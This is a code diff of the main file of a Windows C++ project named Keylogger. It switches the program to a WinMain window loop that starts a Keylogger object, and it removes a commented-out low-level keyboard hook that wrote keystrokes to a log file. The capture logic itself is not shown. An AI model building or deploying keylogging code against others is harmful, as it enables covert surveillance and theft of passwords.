@@ -1,26 +1,69 @@
 // Keylogger.cpp : Defines the entry point for the console application.
 //
 
+
 #include "stdafx.h"
+#include <windows.h>
+#include <string>
+#include <tchar.h>
+#include <stdio.h>
+#include <cstdlib>
+#include <memory>
+#include <io.h>
+#include <fcntl.h>
 
 #include "Keylogger.h"
 
 using namespace std;
 
-std::wofstream logFile;
+shared_ptr<Keylogger> logger;
 
-int main() {
-	Keylogger* logger = new Keylogger();
+LRESULT CALLBACK WndProc(HWND hWnd, UINT message,
+	WPARAM wParam, LPARAM lParam);
+
+INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
+	LPSTR lpCmdLine, INT iCmdShow) {
+	
+	// Add console for debug
+	AllocConsole();
+	freopen("CONOUT$", "w", stdout);
+
+	MSG msg;
+	WNDCLASS wndClass;
+	wndClass.lpfnWndProc = WndProc;
+	wndClass.cbClsExtra = 0;
+	wndClass.cbWndExtra = 0;
+	wndClass.hInstance = hInstance;
+	wndClass.hCursor = LoadCursor(NULL, IDC_ARROW);
+	wndClass.hbrBackground = NULL;
+	wndClass.lpszMenuName = NULL;
+	wndClass.lpszClassName = L"window";
+	RegisterClass(&wndClass);
+
+	std::cout << "hello";
+	printf("djsfdsfjds");
+
+	logger = make_shared<Keylogger>();
 	logger->start();
-	while (GetMessage(NULL, NULL, 0, 0));
+	while (GetMessage(&msg, NULL, 0, 0)) {
+		DispatchMessage(&msg);
+	}
 
-	/*Hook = SetWindowsHookEx(WH_KEYBOARD_LL, kbProc, NULL, 0);
-	logFile.open(L"capturing_your_keyboard.txt", std::ios::app);
+	return msg.wParam;
+}
 
-	while (GetMessage(NULL, NULL, 0, 0));
-
-	logFile.close();*/
-
-	return 0;
+LRESULT CALLBACK WndProc(HWND hWnd, UINT message,
+	WPARAM wParam, LPARAM lParam) {
+	switch (message) {
+	case WM_DESTROY:
+		PostQuitMessage(0);
+		return 0;
+	case WM_QUIT:
+	case WM_CLOSE:
+		logger->stop();
+		return 0;
+	default:
+		return DefWindowProc(hWnd, message, wParam, lParam);
+	}
 }
 
